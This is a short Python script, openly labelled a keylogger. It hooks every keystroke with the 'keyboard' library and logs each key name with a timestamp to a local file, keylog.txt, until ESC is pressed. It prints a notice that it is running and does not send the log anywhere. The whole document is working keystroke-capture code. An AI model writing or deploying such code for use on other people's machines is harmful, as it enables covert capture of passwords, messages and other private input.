import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_key_event(e):
    logging.info(f"Key {e.name} pressed")

keyboard.hook(on_key_event)

print("Keylogger is running... Press ESC to stop.")
keyboard.wait('esc')
